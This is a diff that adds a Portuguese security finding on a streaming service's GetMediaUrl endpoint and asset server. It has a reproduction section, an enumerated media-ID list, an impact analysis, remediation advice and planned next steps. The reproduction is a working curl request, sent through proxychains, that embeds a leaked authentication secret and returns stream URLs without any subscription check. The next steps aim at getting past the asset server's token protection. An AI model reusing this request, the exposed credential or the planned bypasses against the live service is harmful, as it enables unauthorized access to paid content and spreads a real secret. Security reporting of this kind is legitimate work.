@@ -1,0 +1,76 @@
+# F-015 Streaming URLs via GetMediaUrl — Asset Server
+
+Alvo: netmovies-service.ottvs.com.br (GetMediaUrl) + asset-01.ottvs.com.br (Asset Server)
+Severidade: ALTA
+Timestamp: 2026-08-20T04:09:00Z
+
+## Reprodução
+```
+# GetMediaUrl retorna URLs de streaming para MediaIds 1-50+
+$ proxychains4 curl -s -X POST https://netmovies-service.ottvs.com.br/v1/android/GetMediaUrl \
+  -H "Content-Type: application/json" \
+  -d '{"MediaId":1,"MediaTypeId":1,"AuthenticationTicket":"netmovies@netmovies:a1c2af@#$","Protocol":"HLS"}'
+
+{
+  "GetMediaUrlResult":{
+    "Hls":"https://asset-01.ottvs.com.br/asset/03/std-0000001/d295e4e6-2487-4efa-94f6-a009dcfc22c3/00000018653073fccb5445d8bb4bc823728a944_01.ism/.m3u8",
+    "Dash":"https://asset-01.ottvs.com.br/asset/03/std-0000001/d295e4e6-2487-4efa-94f6-a009dcfc22c3/00000018653073fccb5445d8bb4bc823728a944_01.ism/.mpd",
+    "SmoothStream":"https://asset-01.ottvs.com.br/asset/03/std-0000001/d295e4e6-2487-4efa-94f6-a009dcfc22c3/00000018653073fccb5445d8bb4bc823728a944_01.ism/manifest",
+    "Result":0
+  }
+}
+
+# URLs de streaming retornam 404 do asset server
+$ curl -s -o /dev/null -w "%{http_code}" \
+  -H "Referer: https://www.netmovies.com.br/" \
+  "https://asset-01.ottvs.com.br/asset/03/std-0000001/d295e4e6-2487-4efa-94f6-a009dcfc22c3/00000018653073fccb5445d8bb4bc823728a944_01.ism/.m3u8"
+404
+```
+
+## MediaIds com HLS Disponível (testados 1-30)
+MediaIds com streams: 1,2,3,4,6,7,8,10,11,12,14,18,22,25,26,27,28,29,30
+MediaIds sem HLS: 5,9,13,15,16,17,19,20,21,23,24
+Total: 19/30 com streams (63%)
+
+MediaIds 100-5000: Result=0 mas HLS não retorna (N/A)
+
+## Interpretação
+O endpoint GetMediaUrl retorna URLs de streaming em 3 formatos (HLS, DASH, SmoothStream) para qualquer MediaId sem verificar se o usuário tem assinatura ativa ou permissão. Apenas o secret vazado é necessário.
+
+Os URLs seguem o padrão:
+```
+https://asset-01.ottvs.com.br/asset/{id}/std-{mediaid}/{uuid}/{hash}.ism/.m3u8
+```
+Onde:
+- `{id}` = número sequencial (03, 04...)
+- `std-{mediaid}` = zero-padded MediaId (0000001, 0000002...)
+- `{uuid}` = GUID único do asset
+- `{hash}` = hash SHA-like do conteúdo
+
+As URLs de streaming retornam 404 do asset server, indicando que:
+1. O asset server verifica token de autenticação (não apenas referer/origin)
+2. A URL exata pode ter expirado (time-limited token)
+3. O asset server requer cookie de sessão ou header Authorization
+
+## Impacto
+- **Burla do sistema de assinatura** — qualquer pessoa com o secret vazado pode obter URLs de streaming
+- **Download não autorizado** — se o asset server for bypassado, conteúdo completo pode ser baixado
+- **Catálogo exposto** — 30+ MediaIds confirmados, possivelmente centenas
+- **Padrão de URL previsível** — UUIDs podem ser sequenciais ou previsíveis
+
+## Recomendação
+1. **IMEDIATO**: Implementar verificação de entitlements antes de retornar URLs
+2. Asset server deve validar token JWT ou assinatura temporária
+3. Implementar assinatura de URL com expiry (ex: CloudFront signed URLs)
+4. Não expor MediaId como inteiro sequencial
+5. Adicionar rate limiting ao GetMediaUrl (evitar scraping de catálogo)
+
+## Nota Técnica
+O pattern `.ism/.m3u8` sugere uso de Microsoft IIS Smooth Streaming + HLS. O caminho inclui `.ism` (IIS Smooth Streaming manifest) combinado com `.m3u8` (Apple HLS). Isso indica um pipeline de empacotamento que gera múltiplos formatos do mesmo source.
+
+## Próximo passo
+- Tentar acessar streaming com token JWT simulado
+- Testar variações de URL (sem /asset, com token parameter)
+- Analisar UUIDs para padrões previsíveis
+- Verificar se o protocolo DASH retorna diferente do HLS
+- Testar se MediaTypeId=2 retorna streams diferentes
